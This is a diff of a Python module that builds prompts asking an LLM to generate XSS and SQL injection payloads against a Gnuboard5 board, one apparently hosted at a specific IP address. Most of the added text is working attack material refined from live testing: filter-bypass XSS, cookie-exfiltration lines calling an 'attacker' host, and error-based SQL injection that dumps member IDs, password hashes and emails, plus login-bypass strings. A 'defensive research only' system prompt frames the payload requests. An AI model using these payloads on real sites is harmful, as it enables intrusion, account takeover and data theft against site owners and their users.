@@ -1,24 +1,7 @@
-"""
-Context Builder - Gnuboard5 서버 실제 분석 기반 타겟 프롬프트
-Target: http://34.68.27.120:8081/ (Gnuboard5, Apache+PHP+MySQL)
-
-[수동 분석 결과]
-XSS:
-  - wr_subject : 홈 메인/게시글 상단/관리자에 반영 → Stored XSS 고가치
-  - wr_content : img·a·b·p 태그 허용, script 차단 → 이벤트핸들러 우회 필요
-  - stx(search) : value="" 속성에 반영, onfocus=alert(1) → onfocusalert1 필터
-  - wr_content(댓글): http:// 형태만 <a href>로 변환, javascript: 안됨
-
-SQLi:
-  - sfl  : 검색 필드 선택자(wr_subject 등), SQL에 직접 연결 가능성
-  - sst  : ORDER BY 컬럼명, 직접 연결 → ORDER BY Injection
-  - sod  : ASC/DESC, 직접 연결 → ORDER BY Injection
-  - stx  : LIKE '%{input}%' 문자열 컨텍스트
-"""
-
-from typing import Any, Dict
+﻿from typing import Any, Dict
 
 
+# LLM 시스템 프롬프트
 SYSTEM_PROMPT = (
     "You are a cybersecurity expert specializing in web application attacks. "
     "Generate security test payloads for defensive research purposes only. "
@@ -27,10 +10,7 @@ SYSTEM_PROMPT = (
 )
 
 
-# ════════════════════════════════════════════════════════════════
-#  XSS
-# ════════════════════════════════════════════════════════════════
-
+# XSS 빌더
 def build_xss_subject(point: Dict[str, Any], count: int = 5) -> str:
     """
     wr_subject - 게시글 제목 Stored XSS
@@ -47,29 +27,47 @@ Reflection context: Stored in DB, later rendered as post title in:
   - Post detail page heading
   - Admin management page
 
-Known filter behavior:
-  - /bbs/ajax.filter.php pre-filters wr_subject before saving
-  - <script> tag is blocked/removed
-  - Some basic HTML tags (b, a, img, p) may be allowed
-  - Exact filter rules for title field are unclear - try diverse approaches
+Known filter behavior (from /bbs/ajax.filter.php analysis):
+  CONFIRMED BLOCKED:
+    - <script> tag: stripped entirely
+    - onfocus=, onclick= event handlers: removed by filter
+    - HTML entities for = (&#61;, &#x3D;): also filtered
+
+  LIKELY ALLOWED (standard HTML tags not in blocklist):
+    - <img src=x onerror=alert(1)>  - onerror on img not in blocklist
+    - <svg/onload=alert(1)>         - svg tag likely passes
+    - <a href=javascript:...>       - javascript: URI on a tag
+    - <details ontoggle=...>        - HTML5 interactive element
+
+  UNKNOWN (try these):
+    - <video>, <audio>, <marquee>, <iframe> tags
+    - CSS animation-based triggers
+    - Attribute encoding variants
 
 Generate {count} Stored XSS payloads for the wr_subject (title) field.
-Focus on these bypass strategies:
-1. HTML5 event handlers on tags that are NOT script: <img onerror>, <svg onload>, <details ontoggle>
-2. javascript: URI in href attribute: <a href="javascript:alert(1)">x</a>
-3. CSS-based: <style>*{"{"}color:red;animation-name:x{"}"}</style><p style="animation-name:x" onanimationstart=alert(1)>
-4. Filter bypass with HTML entities: <img src=x onerror&#61;alert(1)>
-5. Backtick function call (avoids parentheses if filtered): <img src=x onerror=alert`1`>
-6. Short polyglot: <svg/onload=alert(1)>, <body onload=alert(1)>
-7. Encoded tag names: <&#105;mg src=x onerror=alert(1)>
-8. Attribute without quotes: <img src=x onerror=alert(1) x=>
+DO NOT use: <script>, onfocus=, onclick=, &#61;
+FOCUS on:
+1. onerror/onload/onmouseover on non-script tags: <img onerror=alert(1)>, <svg/onload=alert(1)>
+2. javascript: URI: <a href="javascript:alert(1)">x</a>
+3. Backtick call: <img src=x onerror=alert`1`>
+4. HTML5 elements: <details open ontoggle=alert(1)>x</details>
+5. CSS animation: <p style="animation-name:x;animation-duration:1s" onanimationstart=alert(1)>x</p>
+6. Uncommon events: <img src=x onmouseover=alert(1)>, <body onpageshow=alert(1)>
+7. Encoded tag: <&#x69;mg src=x onerror=alert(1)>
 
+ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | svg_onload | <svg/onload=alert(1)>"""
+STORED_XSS | svg_onload | <svg/onload=alert(1)>
+STORED_XSS | a_javascript | <a href="javascript:alert(1)">x</a>
+STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>
+STORED_XSS | img_backtick | <img src=x onerror=alert`1`>
+STORED_XSS | img_onmouseover | <img src=x onmouseover=alert(1)>
+STORED_XSS | css_animation | <p style="animation-name:x;animation-duration:1s" onanimationstart=alert(1)>x</p>
+STORED_XSS | encoded_tag | <&#x69;mg src=x onerror=alert(1)>"""
 
 
 def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
@@ -109,19 +107,30 @@ For cookie exfiltration variants (replace alert(1) with):
   fetch('http://ATTACKER/?c='+document.cookie)
   new Image().src='http://ATTACKER/?c='+document.cookie
 
+ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>"""
+STORED_XSS | a_javascript | <a href=javascript:alert(1)>click</a>
+STORED_XSS | svg_onload | <svg/onload=alert(1)>
+STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>
+STORED_XSS | video_onerror | <video><source onerror=alert(1)></video>
+STORED_XSS | marquee_onstart | <marquee onstart=alert(1)>x</marquee>
+STORED_XSS | iframe_srcdoc | <iframe srcdoc="<script>alert(1)</script>">
+STORED_XSS | exfil_fetch | <img src=x onerror=fetch('http://attacker/?c='+document.cookie)>"""
 
 
 def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
     """
     stx - 검색창 Reflected XSS
     반영 위치: <input type="text" value="[HERE]"> 속성 내부
-    필터 정보: onfocus=alert(1) → onfocusalert1 (= 와 () 제거 추정)
+    실제 테스트 결과 기반 필터 정보 업데이트됨:
+    - onmouseover=alert(1) → 통과 ✅
+    - onfocus, onclick, onpointerover → 차단 ❌
+    - &#61; (= entity) → 차단 ❌
+    - "<img (태그 탈출) → < > HTML 인코딩됨, 탈출 불가 ❌
     search.php, qalist.php 모두 해당
     """
     return f"""Target: Gnuboard5 search field
@@ -129,41 +138,66 @@ Endpoint: GET /bbs/search.php?stx=[PAYLOAD] and GET /bbs/qalist.php?stx=[PAYLOAD
 Reflection context: Input value reflected inside HTML value attribute:
   <input type="text" name="stx" value="[REFLECTED HERE]">
 
-CONFIRMED filter behavior:
-  - Input "onfocus=alert(1)" is rendered as "onfocusalert1"
-  - The filter appears to REMOVE: = (equals sign), ( (open paren), ) (close paren)
-  - Spaces and special chars around event handlers may also be stripped
+CONFIRMED filter behavior from live testing:
+  WORKING (payload reaches browser unfiltered):
+    - " onmouseover=alert(1) x="  → SUCCESS, executes JS
+    - " onmouseover=alert`1` x="  → SUCCESS, backtick call also works
 
-Generate {count} Reflected XSS payloads that bypass this filter.
-The key challenge: if = and () are removed, how to execute JS?
+  BLOCKED (filter removes or encodes these):
+    - onfocus=       → stripped (entire onfocus handler removed)
+    - onclick=       → stripped
+    - onpointerover= → stripped
+    - &#61; (HTML entity for =) → does NOT bypass filter, stripped
+    - < and > characters → HTML-encoded (&lt; &gt;), tag breakout is IMPOSSIBLE
 
-Strategy options:
-1. Break out of value attribute using " or ' then inject tag:
-   - "><img src=x onerror=alert(1)> (if < > are not encoded)
-   - '><svg/onload=alert(1)>
-2. Use HTML entities for = to bypass literal = filter:
-   - " onmouseover&#61;alert(1) x="
-   - " onerror&#x3D;alert(1) x="
-3. Use backtick for function call (avoids parentheses):
-   - "><img src=x onerror=alert`1`>
-   - " onmouseover=alert`document.cookie` x=
-4. Use eval with fromCharCode (avoids parentheses issue if only outer ones filtered):
-   - "><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
-5. If only onfocus is filtered but other events are not:
-   - " onmouseover=alert(1) x="
-   - " onerror=alert(1) x="
-   - " onpointerover=alert(1) x="
-6. HTML comment tricks:
-   - "><script>alert<!---->( 1)</script>
-7. Use newline/tab instead of space between attribute and value
+KEY INSIGHT:
+  - The " character successfully breaks out of the value="" attribute
+  - onmouseover= is NOT filtered, only certain event handlers are blocked
+  - Tag breakout ("> then new tag) does NOT work because < > are encoded
+  - Must stay WITHIN the attribute context: close quote, inject handler, re-open quote
+  - Backtick syntax alert`1` works as alternative to alert(1)
 
+Generate {count} Reflected XSS payloads that work within the attribute context.
+DO NOT generate:
+  - Tag breakout payloads ("><img, '><svg etc.) - < > are encoded, these FAIL
+  - onfocus, onclick, onpointerover handlers - these are FILTERED
+  - &#61; entity encoding for = - this is ALSO filtered
+
+FOCUS on these working strategies:
+1. Stay in attribute, use onmouseover (confirmed working):
+   " onmouseover=alert(1) x="
+   " onmouseover=alert`document.cookie` x="
+2. Try other mouse/pointer events NOT in the blocklist:
+   " onmouseenter=alert(1) x="
+   " onmouseleave=alert(1) x="
+   " onmousedown=alert(1) x="
+   " onmouseup=alert(1) x="
+3. Form/input events that may not be filtered:
+   " oninput=alert(1) x="
+   " onchange=alert(1) x="
+   " onkeydown=alert(1) x="
+4. Drag events:
+   " ondragover=alert(1) x="
+   " ondragstart=alert(1) x="
+5. Cookie exfiltration via onmouseover (confirmed channel):
+   " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
+   " onmouseover=new/**/Image().src='http://attacker/?c='+document.cookie x="
+
+ONLY USE THIS TYPE: REFLECTED_XSS
+REMINDER: every payload MUST start with " and end with x=" to stay inside the attribute
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-REFLECTED_XSS | value_breakout | "><img src=x onerror=alert(1)>
-REFLECTED_XSS | entity_bypass | " onmouseover&#61;alert(1) x="
-REFLECTED_XSS | backtick_call | "><img src=x onerror=alert`1`>"""
+REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
+REFLECTED_XSS | onmouseover_backtick | " onmouseover=alert`1` x="
+REFLECTED_XSS | onmouseover_cookie | " onmouseover=alert(document.cookie) x="
+REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
+REFLECTED_XSS | onmouseleave | " onmouseleave=alert(1) x="
+REFLECTED_XSS | onmousedown | " onmousedown=alert(1) x="
+REFLECTED_XSS | onmouseup | " onmouseup=alert(1) x="
+REFLECTED_XSS | oninput | " oninput=alert(1) x="
+REFLECTED_XSS | onkeydown | " onkeydown=alert(1) x=\""""
 
 
 def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
@@ -180,34 +214,49 @@ CONFIRMED filter behavior:
   - URLs starting with http:// or https:// followed by valid domain → auto-converted to <a href="...">
   - javascript:alert(1) → NOT converted to link, rendered as plain text
   - incomplete URLs → rendered as plain text
-  - Script and other dangerous tags may be filtered
+  - onfocus=, onclick= event handlers: BLOCKED by filter (confirmed from search field tests)
+  - onmouseover= event handler: PASSES filter (confirmed working in search field tests)
 
 Strategy: The auto-link feature converts http:// URLs to <a href>
-Can we inject into the URL itself? For example:
-  - http://x.com" onmouseover="alert(1)
-  - http://x.com/ onclick=alert(1)//
-  If these get wrapped in <a href="http://x.com" onmouseover="alert(1)">, it works!
+Inject event handlers into the URL so the generated <a> tag carries the handler:
+  Input:  http://x.com" onmouseover="alert(1)
+  Output: <a href="http://x.com" onmouseover="alert(1)">http://x.com" onmouseover="alert(1)</a>
+  Result: mouseover triggers alert!
 
 Generate {count} Stored XSS payloads for comment content.
 Focus on:
-1. Inject into auto-linked URL: http://x" onmouseover="alert(1)
-2. Inject event into URL path: http://x.x/path onclick=alert(1)//
-3. Malformed URL that still gets linkified with attribute injection
-4. Direct HTML injection (if tags not fully filtered in comments)
-5. CSS injection via style tags if allowed
+1. URL attribute injection with onmouseover (confirmed working event):
+   http://x.com" onmouseover="alert(1)
+   http://x.x" onmouseover="alert`1`
+2. URL path injection with onmouseover:
+   http://x.x/path" onmouseover="alert(document.cookie)
+3. Other mouse events not in blocklist:
+   http://x.x" onmouseenter="alert(1)
+   http://x.x" onmouseleave="alert(1)
+4. Direct HTML injection (if comment tags not filtered):
+   <img src=x onerror=alert(1)>
+   <svg/onload=alert(1)>
+5. Cookie exfiltration variant:
+   http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)
 
+DO NOT use: onclick=, onfocus= (these are filtered)
+
+ONLY USE THIS TYPE: STORED_XSS
+REMINDER: DO NOT use onclick= or onfocus= — they are filtered
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-STORED_XSS | url_attr_inject | http://x.x" onmouseover="alert(1)
-STORED_XSS | img_onerror | <img src=x onerror=alert(1)>"""
+STORED_XSS | url_onmouseover | http://x.com" onmouseover="alert(1)
+STORED_XSS | url_backtick | http://x.x" onmouseover="alert`1`
+STORED_XSS | url_onmouseenter | http://x.x" onmouseenter="alert(1)
+STORED_XSS | url_onmouseleave | http://x.x" onmouseleave="alert(1)
+STORED_XSS | url_cookie | http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)
+STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
+STORED_XSS | svg_onload | <svg/onload=alert(1)>"""
 
 
-# ════════════════════════════════════════════════════════════════
-#  SQLi - Gnuboard5 타겟 특화
-# ════════════════════════════════════════════════════════════════
-
+# SQLi 빌더 - Gnuboard5 특화
 def build_sqli_orderby(point: Dict[str, Any], count: int = 5) -> str:
     """
     sst / sod - ORDER BY Injection
@@ -247,13 +296,18 @@ Attack techniques:
 Note: ORDER BY does NOT allow UNION SELECT directly, but subqueries work.
 Format sst values only (what goes after ORDER BY).
 
+ONLY USE THIS TYPE: SQLI_ORDERBY
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 SQLI_ORDERBY | time_sleep | (SELECT SLEEP(5))
+SQLI_ORDERBY | time_if | IF(1=1,SLEEP(5),wr_datetime)
+SQLI_ORDERBY | time_subq | wr_datetime,(SELECT SLEEP(5))
 SQLI_ORDERBY | bool_case | CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
-SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""
+SQLI_ORDERBY | bool_ascii | CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END
+SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))
+SQLI_ORDERBY | error_updatexml | UPDATEXML(1,CONCAT(0x7e,user()),1)"""
 
 
 def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
@@ -263,6 +317,12 @@ def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
     WHERE {sfl} LIKE '%{stx}%'
     값이 wr_subject, wr_content, mb_id 등이 기대되지만
     검증이 부족한 경우 SQL 구문 주입 가능
+
+    실제 테스트 결과:
+    - EXTRACTVALUE, UPDATEXML → 에러 없이 false_len 반환 (서버가 에러 숨김 또는 화이트리스트)
+    - CASE WHEN 표현식 → false_len 반환 (컬럼명이 아닌 표현식은 Gnuboard5가 필터링 가능성)
+    - sfl 화이트리스트: wr_subject, wr_content, wr_subject||wr_content 등 정상값만 허용 추정
+    → 전략: 화이트리스트 우회 (정상값 뒤에 SQL 구문 이어붙이기)
     """
     return f"""Target: Gnuboard5 search field selector
 Endpoint: GET {point.get('url')}, parameter: sfl (search field selector)
@@ -273,83 +333,166 @@ Normal values: wr_subject, wr_content, mb_id, wr_subject||wr_content
 The sfl parameter is placed directly as a column/expression name in WHERE clause.
 No quote marks surround the sfl value itself.
 
+IMPORTANT - live test results:
+  - Pure expressions (EXTRACTVALUE, CASE WHEN alone) return no signal
+  - Server likely applies a soft whitelist, rejecting unknown expressions silently
+  - STRATEGY: piggyback on a valid column name, append SQL after it
+    e.g., sfl=wr_subject) AND (EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+    Result SQL: WHERE wr_subject) AND (EXTRACTVALUE(...)-- - LIKE '%keyword%'
+
 Generate {count} SQLi payloads for the sfl (field selector) parameter.
-Attack techniques for field-context injection:
+Use VALID column names as prefix to pass the whitelist check, then inject after:
 
-1. Time-based (execute SLEEP as the field expression):
-   sfl=IF(1=1,SLEEP(5),wr_datetime)
-   sfl=wr_subject AND SLEEP(5) OR wr_subject
+1. Error-based after valid column (close paren, inject, comment):
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+   wr_subject)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -
 
-2. Error-based (inject error function as field):
-   sfl=EXTRACTVALUE(1,CONCAT(0x7e,database()))
-   sfl=UPDATEXML(1,CONCAT(0x7e,user()),1)
+2. Time-based after valid column:
+   wr_subject)AND(SLEEP(5))-- -
+   wr_subject)AND(IF(1=1,SLEEP(5),0))-- -
 
-3. Boolean blind (compare field to subquery):
-   sfl=wr_subject AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1
+3. Boolean blind after valid column:
+   wr_subject)AND(1=1)-- -    <- TRUE baseline
+   wr_subject)AND(1=2)-- -    <- FALSE baseline
 
-4. Stacked logic injection:
-   sfl=1 AND (SELECT SLEEP(5))=0 AND 1
+4. Subquery error after valid column:
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))))-- -
 
-5. Subquery in field position:
-   sfl=(SELECT IF(1=1,SLEEP(5),0))
+Note: Try both with and without closing parenthesis before AND, depending on actual SQL structure.
+Also try: wr_subject||wr_content as prefix (both columns concatenated).
 
+ONLY USE THIS TYPE: SQLI_FIELD
+REMINDER: every payload MUST start with a valid column name (wr_subject or wr_subject||wr_content)
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-SQLI_FIELD | time_if_sleep | IF(1=1,SLEEP(5),wr_datetime)
-SQLI_FIELD | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""
+SQLI_FIELD | piggyback_error_db | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+SQLI_FIELD | piggyback_error_ver | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -
+SQLI_FIELD | piggyback_error_user | wr_subject)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
+SQLI_FIELD | piggyback_sleep | wr_subject)AND(SLEEP(5))-- -
+SQLI_FIELD | piggyback_if_sleep | wr_subject)AND(IF(1=1,SLEEP(5),0))-- -
+SQLI_FIELD | piggyback_true | wr_subject)AND(1=1)-- -
+SQLI_FIELD | piggyback_false | wr_subject)AND(1=2)-- -
+SQLI_FIELD | concat_prefix | wr_subject||wr_content)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"""
 
 
 def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
     """
-    stx / sca - 문자열 컨텍스트 SQLi
-    LIKE '%{input}%' 형태로 사용
-    addslashes() 또는 mysqli_real_escape_string() 적용 가능
-    멀티바이트 문자셋 우회 또는 필터 우회 시도
+    stx - 검색 키워드 SQLi (Gnuboard5 INSTR 컨텍스트)
+
+    [실제 SQL 구조 - 브라우저 에러 메시지로 직접 확인]
+    PHP가 stx를 공백으로 단어 분리 후 각 단어를 아래 형태로 래핑:
+      WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD1')))) AND ((INSTR(LOWER(wr_subject), LOWER('WORD2'))))
+
+    CRITICAL CONSTRAINTS (위반 시 페이로드 무효):
+    1. 페이로드에 공백 절대 금지 - 공백이 있으면 PHP가 단어분리하여 별도 INSTR 조건이 됨
+    2. 주석은 # 사용 (-- 는 MySQL에서 뒤에 공백 필요 -> 공백 쓰면 단어분리 발생)
+    3. 따옴표 닫은 뒤 괄호 4개 닫아야 함: a'))))
+         '  -> LOWER()의 문자열 리터럴 닫기
+         )  -> LOWER() 함수 닫기
+         )  -> INSTR() 함수 닫기
+         )) -> 외부 (( 래퍼 닫기
+    4. 서브쿼리 내부 공백은 /**/ 로 대체
+    5. SLEEP 계열은 SQL 에러가 먼저 발생하면 실행 안 됨 (에러기반 우선)
+    6. LIMIT 절: LIMIT(n,m) 형태는 MySQL에서 지원 안 됨 → LIMIT/**/n,m 사용
+    7. FROM 절: FROM(tablename) 형태 오류 → FROM/**/tablename 사용
     """
-    return f"""Target: Gnuboard5 search keyword / category parameter
+    return f"""Target: Gnuboard5 search keyword parameter
 Endpoint: GET {point.get('url')}, parameter: {point.get('param', 'stx')}
-Injection context: String LIKE query:
-  SELECT * FROM g5_write_free WHERE wr_subject LIKE '%{{input}}%'
 
-Filter info: Gnuboard5 uses addslashes() or mysqli_real_escape_string()
-Single/double quotes are likely escaped with backslash.
+ACTUAL SQL STRUCTURE (confirmed via MySQL error page):
+  PHP splits stx by SPACES into words, each wrapped in this template:
+    WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD'))))
 
-Generate {count} SQLi payloads for string context with escape mitigation.
-Attack techniques:
+  For a single-word input the full WHERE clause is:
+    WHERE ((INSTR(LOWER(wr_subject), LOWER('{{input}}'))))
 
-1. If escape can be bypassed via multiline/comment:
-   %' OR 1=1-- -
-   %' AND SLEEP(5)-- -
+CRITICAL CONSTRAINTS - violating any one will break the injection:
+  1. ZERO spaces anywhere in the payload
+       Reason: PHP does stx.split(' ') -> each word becomes its own INSTR condition
+       If your payload has a space, it becomes TWO separate INSTR conditions -> SQL syntax error
+  2. Use # as the comment terminator, NOT -- or -- -
+       Reason: -- requires a trailing space in MySQL, but spaces are forbidden (rule 1)
+  3. Must close FOUR parentheses after the injected quote:  a'))))
+       '   closes the LOWER() string literal
+       )   closes LOWER()
+       )   closes INSTR()
+       ))  closes the outer (( wrapper from the PHP template
+  4. ALL spaces inside subqueries MUST be replaced with /**/
+       CORRECT:   FROM/**/information_schema.tables
+       WRONG:     FROM(information_schema.tables)   <- syntax error, DO NOT use
+  5. LIMIT syntax: LIMIT is NOT a function, cannot use parentheses
+       CORRECT:   LIMIT/**/0,1   or   LIMIT/**/1
+       WRONG:     LIMIT(0,1)          <- syntax error, DO NOT use
+  6. Error-based payloads fire before SLEEP() executes - prefer EXTRACTVALUE for data extraction
 
-2. Second-order injection (if stored then re-used):
-   admin'-- -
+Escape/injection pattern:
+  Input:   a'))))INJECTION_HERE#
+  SQL:     WHERE ((INSTR(LOWER(wr_subject), LOWER('a'))))INJECTION_HERE#'))))
+                                                          ^^^^^^^^^^^^^^^^ your code runs here
+                                                                          ^ # comments out remaining '))))
 
-3. Numeric subquery without quotes:
-   %' AND (SELECT 1 FROM dual WHERE 1=1)='1
+Generate {count} SQLi payloads for this INSTR string context.
+ALL payloads MUST:
+  - Start with:  a'))))
+  - End with:    #
+  - Contain NO space characters (use /**/ inside subqueries instead)
+  - Never use FROM(table) or LIMIT(n,m) syntax
 
-4. Unicode/encoding bypass:
-   %\u0027 OR 1=1-- -
-   %' OR '1'='1
+Attack techniques to cover:
 
-5. Wildcard abuse for information disclosure:
-   % (returns all records)
-   %admin% (reveals existence of admin)
-   %password%
+1. BOOLEAN TRUE / FALSE pair (baseline detection):
+   a'))))OR(1=1)#          <- TRUE  - returns all rows
+   a'))))AND(1=2)#         <- FALSE - returns zero rows
 
-6. If quotes aren't escaped (misconfiguration):
-   ' OR SLEEP(5)-- -
-   ' UNION SELECT 1,2,3-- -
-   ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+2. BOOLEAN with conditional subqueries (/**/ replaces every space):
+   a'))))AND(LENGTH(database())>0)#
+   a'))))AND(MID(database(),1,1)REGEXP(0x5e61))#       <- MID is alias for SUBSTRING, REGEXP avoids >
+   a'))))AND((SELECT/**/1/**/FROM/**/information_schema.tables/**/LIMIT/**/1)=1)#
 
+3. ERROR-BASED data extraction via EXTRACTVALUE (most reliable):
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,user())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1,1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_email/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#
+
+   Hex values for common table names (use instead of quotes to avoid escaping):
+     g5_member  = 0x67355f6d656d626572
+     g5_admin   = 0x67355f61646d696e
+     g5_board   = 0x67355f626f617264
+
+4. TIME-BASED blind via SLEEP (use only if no errors triggered):
+   a'))))AND(SLEEP(5))#
+   a'))))AND(IF(1=1,SLEEP(5),0))#
+
+ONLY USE THESE TYPES: BOOLEAN, ERROR_BASED, TIME_BASED
+REMINDER: every payload MUST start with a')))) and end with # and contain NO spaces
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-SQLI_STRING | quote_escape_basic | ' OR 1=1-- -
-SQLI_STRING | time_sleep | ' AND SLEEP(5)-- -
-SQLI_STRING | union_probe | ' UNION SELECT 1,2,3-- -"""
+BOOLEAN | instr_true | a'))))OR(1=1)#
+BOOLEAN | instr_false | a'))))AND(1=2)#
+BOOLEAN | instr_len | a'))))AND(LENGTH(database())>0)#
+BOOLEAN | instr_mid | a'))))AND(MID(database(),1,1)REGEXP(0x5e61))#
+BOOLEAN | instr_subq | a'))))AND((SELECT/**/1/**/FROM/**/information_schema.tables/**/LIMIT/**/1)=1)#
+ERROR_BASED | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+ERROR_BASED | extract_ver | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
+ERROR_BASED | extract_user | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,user())))#
+ERROR_BASED | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+ERROR_BASED | extract_member | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+ERROR_BASED | extract_member2 | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1,1))))#
+ERROR_BASED | extract_email | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_email/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+ERROR_BASED | extract_cols | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#
+TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#
+TIME_BASED | instr_if_sleep | a'))))AND(IF(1=1,SLEEP(5),0))#"""
+
 
 
 def build_sqli_login(point: Dict[str, Any], count: int = 5) -> str:
@@ -390,19 +533,22 @@ Attack techniques:
 5. UNION-based (determine column count of member table):
    mb_id: ' UNION SELECT 1,2,3,4,5-- -
 
+ONLY USE THIS TYPE: SQLI_LOGIN
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 SQLI_LOGIN | auth_bypass | admin'-- -
 SQLI_LOGIN | tautology | ' OR '1'='1'-- -
-SQLI_LOGIN | time_sleep | ' AND SLEEP(5)-- -"""
+SQLI_LOGIN | tautology2 | admin' OR 1=1-- -
+SQLI_LOGIN | tautology3 | ' OR '1'='1
+SQLI_LOGIN | time_sleep | 0 OR SLEEP(5)-- -
+SQLI_LOGIN | time_cond | admin' AND SLEEP(5)-- -
+SQLI_LOGIN | error_extract | ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+SQLI_LOGIN | error_update | ' OR UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"""
 
 
-# ════════════════════════════════════════════════════════════════
-#  기존 일반 SQLi (호환성 유지)
-# ════════════════════════════════════════════════════════════════
-
+# SQLi 빌더 - 일반형 (호환성 유지)
 def build_sqli_error(point: Dict[str, Any], count: int = 5) -> str:
     return f"""Target SQL injection - Error-based
 Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
@@ -479,10 +625,9 @@ TAUTOLOGY | numeric_basic | 0 OR (1=1)
 CONDITIONAL | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64"""
 
 
-# ════════════════════════════════════════════════════════════════
 #  Router
-# ════════════════════════════════════════════════════════════════
 
+# 라우터 - vuln_type 문자열 → 빌더 함수 매핑
 BUILDERS = {
     # XSS - 서버 분석 기반
     "xss_subject":     build_xss_subject,      # wr_subject: 제목 Stored XSS
@@ -514,7 +659,6 @@ def build_prompt(point: Dict[str, Any], vuln_type: str, **kwargs) -> str:
     return builder(point, **kwargs)
 
 
-# ── 직접 실행 시 프롬프트 미리보기 ──────────────────────────────
 if __name__ == "__main__":
     sample_xss = {
         "url": "/bbs/write_update.php", "method": "POST",
